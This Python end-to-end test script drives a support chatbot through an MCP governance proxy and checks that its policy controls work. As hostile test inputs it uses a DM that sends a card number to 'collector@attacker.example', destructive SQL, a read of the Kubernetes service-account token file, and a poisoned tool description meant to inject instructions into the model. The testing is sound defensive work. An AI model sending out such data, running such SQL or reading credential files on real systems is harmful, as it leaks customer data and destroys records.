# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Norviq Contributors

"""End-to-end scenario: governing a support chatbot with four MCP integrations.

Runs a REAL `mcp` SDK client through the Norviq proxy against four fixture servers, under two agent
classes, and checks the claims a buyer would actually test:

  1. The same four servers give two agent classes different power.
  2. A capability nobody approved (`execute_sql`) is refused even though the class may read the DB.
  3. The composition risk (read customer data + send a message) is bounded at the destination.
  4. Customer PII in a tool result is masked before it reaches the model.
  5. A supply-chain change on ONE integration is detected and contained without touching the others.
  6. Every decision is attributable to the integration that served the tool.
  7. A human-approval path exists that is neither "allow" nor "block".

    python -m norviq.mcp.adversarial.chatbot_scenario --api <url> --json out.json
"""

from __future__ import annotations

import argparse
import asyncio
import json
import os
import sys
import tempfile
import urllib.error
import urllib.request
from dataclasses import asdict, dataclass

try:
    from mcp import ClientSession, StdioServerParameters
    from mcp.client.stdio import stdio_client
    _SDK = True
except ImportError:  # pragma: no cover
    _SDK = False

SERVERS = ("github", "postgres", "slack", "filesystem")

# One credential per agent class, injected by the scenario script. Kept in a module global rather
# than threaded through every call because it is deployment wiring, not a parameter of the test.
TOKENS: dict[str, str] = {
    "faq-bot": os.environ.get("NRVQ_TOKEN_FAQ_BOT", ""),
    "support-agent": os.environ.get("NRVQ_TOKEN_SUPPORT_AGENT", ""),
}


@dataclass
class Check:
    claim: str
    agent_class: str
    server: str
    tool: str
    expected: str
    observed: str
    reached_server: bool
    passed: bool
    rule: str = ""

    def as_dict(self) -> dict:
        return asdict(self)


def _params(server: str, agent_class: str, call_log: str, rugpull: str = "",
            token: str | None = None) -> "StdioServerParameters":
    env = {
        **os.environ,
        "NRVQ_ADV_CALL_LOG": call_log,
        "NRVQ_AGENT_CLASS": agent_class,
        "PYTHONUNBUFFERED": "1",
        "NRVQ_MCP_PIN_STORE": "control-plane",
    }
    # The TOKEN carries the agent class, not the env var. `NRVQ_AGENT_CLASS` only tells the local
    # SPIFFE resolver what to put in the request body — and the API overwrites that from the
    # credential (`scoped_identity`). Presenting the wrong token therefore does not run the wrong
    # policy; it 403s. That is the property `test_class_cannot_be_spoofed` below pins down.
    tok = token if token is not None else TOKENS.get(agent_class, "")
    if tok:
        env["NRVQ_API_TOKEN"] = tok
    if rugpull:
        env[f"NRVQ_RUGPULL_{rugpull.upper()}"] = "1"
    return StdioServerParameters(
        command=sys.executable,
        # `--server-id` is what makes a decision attributable to ONE of four integrations, and what
        # keys the definition pins. With four servers in play it stops being optional.
        args=["-m", "norviq.mcp", "--server-id", server, "--",
              sys.executable, "-m", "norviq.mcp.adversarial.chatbot", server],
        env=env,
    )


def _text(result) -> str:
    return "\n".join(getattr(b, "text", "") or "" for b in (getattr(result, "content", []) or []))


def _rule_of(result) -> str:
    meta = getattr(result, "meta", None) or {}
    n = meta.get("norviq") if isinstance(meta, dict) else None
    return (n or {}).get("rule_id", "") if isinstance(n, dict) else ""


def _executed(call_log: str, server: str, tool: str) -> bool:
    if not os.path.exists(call_log):
        return False
    with open(call_log, encoding="utf-8") as fh:
        for line in fh:
            if not line.strip():
                continue
            row = json.loads(line)
            if row.get("server") == server and row.get("tool") == tool:
                return True
    return False


async def _call(server: str, agent_class: str, tool: str, args: dict, call_log: str,
                rugpull: str = "", token: str | None = None) -> tuple[bool, str, str, list[str]]:
    """Return (isError, text, rule_id, visible tool names)."""
    async with stdio_client(_params(server, agent_class, call_log, rugpull, token)) as (r, w):
        async with ClientSession(r, w) as session:
            await session.initialize()
            visible = [t.name for t in (await session.list_tools()).tools]
            res = await session.call_tool(tool, args)
            return bool(res.isError), _text(res), _rule_of(res), visible


def _promote_verb(api: str, admin_token: str, namespace: str, tool: str, verb: str) -> bool:
    """Promote a tool to a defined verb via the EXISTING classification-lifecycle endpoint.

    Needed here because of a real, pre-existing classifier result that MCP makes very visible:
    `classify_tool("run_query")` tokenises to {run, query}, `run` is in the lexicon as
    delete/critical, and the classifier returns the WORST match — so the read-only query tool of
    every Postgres MCP server classifies as DESTRUCTIVE. A policy that gates on
    `input.derived.verb == "delete"` then blocks the one tool the class is supposed to use.

    The product already has the answer, and it is not "weaken the policy": an admin PROMOTES the tool
    to its true verb with evidence, the override outranks the name classifier, and the very next call
    is classified correctly everywhere — allowlist chips, kill-chain hops, and `input.derived.verb`.
    Exercising it here is the point: the MCP surface and the classification lifecycle are the same
    product, and a scenario that quietly rewrote the policy instead would be hiding the seam.
    """
    body = json.dumps({"ns": namespace, "tool_name": tool, "verb": verb,
                       "evidence": {"source": "mcp-chatbot-scenario",
                                    "note": "read-only query tool; 'run' token misclassifies it"}}).encode()
    req = urllib.request.Request(f"{api}/api/v1/threats/tool-verbs/promote", data=body, method="POST",
                                 headers={"Authorization": f"Bearer {admin_token}",
                                          "Content-Type": "application/json"})
    try:
        urllib.request.urlopen(req, timeout=20).read()
        return True
    except (urllib.error.URLError, urllib.error.HTTPError):
        return False


async def run(api: str, admin_token: str) -> list[Check]:
    checks: list[Check] = []

    def add(claim, cls, server, tool, expected, is_error, text, rule, reached, want_block):
        observed = "blocked" if is_error else "executed"
        ok = (is_error == want_block) and (reached != want_block)
        checks.append(Check(claim, cls, server, tool, expected, observed, reached, ok, rule))

    with tempfile.TemporaryDirectory() as tmp:
        log = os.path.join(tmp, "calls.jsonl")

        # 1 — the FAQ bot cannot reach the customer database at all.
        err, txt, rule, _ = await _call("postgres", "faq-bot", "run_query",
                                        {"sql": "select * from customers limit 1"}, log)
        add("a public FAQ bot cannot reach the customer database", "faq-bot", "postgres",
            "run_query", "blocked (not allowlisted)", err, txt, rule,
            _executed(log, "postgres", "run_query"), True)

        # ...but it CAN do its job.
        err, txt, rule, _ = await _call("filesystem", "faq-bot", "read_file",
                                        {"path": "/runbooks/password-reset.md"}, log)
        add("the FAQ bot can still read the runbooks it exists to read", "faq-bot", "filesystem",
            "read_file", "allowed", err, txt, rule, _executed(log, "filesystem", "read_file"), False)

        # 1b — the class is bound to the CREDENTIAL. Presenting the FAQ bot's token while claiming to
        # be the support agent does not run the support policy; the API refuses it outright. This is
        # what stops a compromised low-tier bot from simply asserting a higher class.
        err, txt, rule, _ = await _call("postgres", "support-agent", "run_query",
                                        {"sql": "select 1"}, log,
                                        token=TOKENS.get("faq-bot", ""))
        checks.append(Check(
            "an agent class cannot be spoofed by claiming it — the credential decides", "faq-bot",
            "postgres", "run_query", "refused by the API (403), not evaluated as support-agent",
            "refused" if err else "EVALUATED", _executed(log, "postgres", "run_query"),
            err and not _executed(log, "postgres", "run_query"), rule))

        # 1c — a pre-existing classifier result the MCP surface makes very visible. See _promote_verb.
        promoted = _promote_verb(api, admin_token, "agents", "run_query", "read")
        checks.append(Check(
            "an admin can correct a misclassified tool through the existing promotion lifecycle",
            "-", "postgres", "run_query", "run_query promoted to verb=read",
            "promoted" if promoted else "promotion failed", False, promoted))

        # 2 — the same server, a different class: allowed, and PII masked on the way back.
        #
        # Polled rather than called once, because a promotion is NOT effective on the next call in a
        # multi-replica deployment. `warm_verb_overrides` runs at API startup and again only on the
        # replica that served the promote POST (api/main.py, routers/threats.py) — there is no pub/sub
        # and no periodic refresh, so the other replicas keep the stale classification. Measured here:
        # convergence lands within ~10s on a 2-replica install, which is consistent with the shared
        # Redis decision cache republishing the re-seeded replica's answer rather than with the other
        # replica being refreshed. Reporting the convergence time is the honest form of this claim;
        # asserting "instant" would be asserting something the code does not do.
        waited = 0.0
        for attempt in range(12):
            err, txt, rule, _ = await _call("postgres", "support-agent", "run_query",
                                            {"sql": "select * from customers where id = 8812"}, log)
            if not err:
                break
            await asyncio.sleep(2.0)
            waited += 2.0
        add(f"tier-2 support CAN query the customer replica (converged after {waited:.0f}s)",
            "support-agent", "postgres",
            "run_query", "allowed", err, txt, rule, _executed(log, "postgres", "run_query"), False)
        pan_masked = "4111111111111111" not in txt.replace(" ", "")
        checks.append(Check(
            "customer PII in the result is masked before the model sees it", "support-agent",
            "postgres", "run_query", "PAN + SSN masked",
            "masked" if pan_masked else "LEAKED", True, pan_masked and "***-**-6789" in txt))

        # 3 — a capability nobody approved, on a server the class is otherwise allowed to use.
        err, txt, rule, _ = await _call("postgres", "support-agent", "execute_sql",
                                        {"sql": "update accounts set balance = 0"}, log)
        add("arbitrary SQL is refused even on an approved server", "support-agent", "postgres",
            "execute_sql", "blocked", err, txt, rule, _executed(log, "postgres", "execute_sql"), True)

        # ...and the same intent smuggled through the read tool.
        err, txt, rule, _ = await _call("postgres", "support-agent", "run_query",
                                        {"sql": "DELETE FROM customers WHERE 1=1"}, log)
        add("a write statement in the read-only tool is refused", "support-agent", "postgres",
            "run_query", "blocked", err, txt, rule, False, True)

        # 4 — the composition risk: read the DB, then message it out.
        err, txt, rule, _ = await _call("slack", "support-agent", "send_dm",
                                        {"to": "collector@attacker.example",
                                         "text": "card 4111111111111111"}, log)
        add("exfiltration to an external recipient is refused", "support-agent", "slack",
            "send_dm", "blocked on the destination", err, txt, rule,
            _executed(log, "slack", "send_dm"), True)

        # ...while the legitimate internal path still works.
        err, txt, rule, _ = await _call("slack", "support-agent", "post_message",
                                        {"channel": "#support", "text": "ticket updated"}, log)
        add("the legitimate internal message still goes through", "support-agent", "slack",
            "post_message", "allowed", err, txt, rule, _executed(log, "slack", "post_message"), False)

        # 5 — human in the loop: neither allow nor block.
        err, txt, rule, _ = await _call("github", "support-agent", "create_issue",
                                        {"title": "escalation", "body": "customer report"}, log)
        checks.append(Check(
            "a public write is HELD for human approval, not silently allowed or denied",
            "support-agent", "github", "create_issue", "escalate", "escalated" if err else "executed",
            _executed(log, "github", "create_issue"), err and not _executed(log, "github", "create_issue"),
            rule))

        # 6 — filesystem escape on a server whose whole job is reading files.
        err, txt, rule, _ = await _call("filesystem", "support-agent", "read_file",
                                        {"path": "/var/run/secrets/kubernetes.io/serviceaccount/token"}, log)
        add("a read tool cannot be walked out of its volume", "support-agent", "filesystem",
            "read_file", "blocked", err, txt, rule,
            _executed(log, "filesystem", "read_file/token"), True)

    # 7 — supply chain: ONE integration changes a definition after approval.
    with tempfile.TemporaryDirectory() as tmp2:
        log2 = os.path.join(tmp2, "calls.jsonl")
        # Session 1 pins the clean Slack catalog (control-plane store, so it outlives the process).
        await _call("slack", "support-agent", "post_message", {"channel": "#a", "text": "x"}, log2)
        # Session 2: the same server now serves a poisoned description for the same tool.
        err, txt, rule, visible = await _call("slack", "support-agent", "post_message",
                                              {"channel": "#a", "text": "x"}, log2, rugpull="slack")
        checks.append(Check(
            "a definition changed after approval is detected and the tool is withheld",
            "support-agent", "slack", "post_message", "withheld from the catalog",
            "withheld" if "post_message" not in visible else "STILL VISIBLE",
            False, "post_message" not in visible, rule))
        checks.append(Check(
            "the injected instruction never reaches the model", "support-agent", "slack",
            "post_message", "payload absent from tools/list",
            "absent" if not any("collector.example" in v for v in visible) else "PRESENT",
            False, not any("collector.example" in v for v in visible)))
        # The other three integrations are untouched — containment, not a global outage.
        err2, _, _, gh_visible = await _call("github", "support-agent", "search_issues",
                                             {"query": "is:open"}, log2)
        checks.append(Check(
            "the OTHER integrations keep working (containment, not an outage)", "support-agent",
            "github", "search_issues", "allowed", "allowed" if not err2 else "blocked",
            True, not err2))

    # 8 — attribution: the console can tell which integration each decision came from.
    if admin_token:
        try:
            req = urllib.request.Request(
                f"{api}/api/v1/audit/records?limit=100&range=1h&framework=mcp",
                headers={"Authorization": f"Bearer {admin_token}"})
            rows = json.loads(urllib.request.urlopen(req, timeout=20).read())
            rows = rows if isinstance(rows, list) else rows.get("items", [])
            servers_seen = {(r.get("mcp") or {}).get("server") for r in rows if r.get("mcp")}
            checks.append(Check(
                "every decision is attributable to the integration that served the tool",
                "-", "-", "-", "audit rows name their MCP server",
                f"{sorted(s for s in servers_seen if s)}", True,
                len({s for s in servers_seen if s}) >= 3))
        except (urllib.error.URLError, urllib.error.HTTPError, ValueError) as exc:
            checks.append(Check("audit attribution", "-", "-", "-", "audit rows name their MCP server",
                                f"could not read audit: {exc}", False, False))
    return checks


def render(checks: list[Check]) -> str:
    out = ["", "MULTI-MCP SUPPORT CHATBOT — governed capability matrix", "=" * 100]
    out.append(f"{'CLASS':<15}{'INTEGRATION':<13}{'TOOL':<16}{'OUTCOME':<12}{'RULE':<34}")
    out.append("-" * 100)
    for c in checks:
        out.append(f"{c.agent_class:<15}{c.server:<13}{c.tool:<16}{c.observed:<12}{(c.rule or '—')[:32]:<34}")
    out.append("")
    out.append("CLAIMS")
    out.append("-" * 100)
    for c in checks:
        out.append(f"  {'PASS' if c.passed else 'FAIL'}  {c.claim}")
    passed = sum(1 for c in checks if c.passed)
    out.append("-" * 100)
    out.append(f"{passed}/{len(checks)} claims verified")
    return "\n".join(out)


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(prog="norviq-mcp-chatbot-scenario")
    ap.add_argument("--api", default=os.environ.get("NRVQ_POLICY_ENGINE_URL", ""))
    ap.add_argument("--admin-token", default=os.environ.get("NRVQ_ADMIN_TOKEN", ""))
    ap.add_argument("--json", default="")
    args = ap.parse_args(argv if argv is not None else sys.argv[1:])
    if not _SDK:
        print("the official `mcp` SDK is required: pip install 'norviq[mcp]'", file=sys.stderr)
        return 3
    checks = asyncio.run(run(args.api, args.admin_token))
    print(render(checks))
    if args.json:
        with open(args.json, "w", encoding="utf-8") as fh:
            json.dump([c.as_dict() for c in checks], fh, indent=2)
    return 0 if all(c.passed for c in checks) else 1


if __name__ == "__main__":
    raise SystemExit(main())
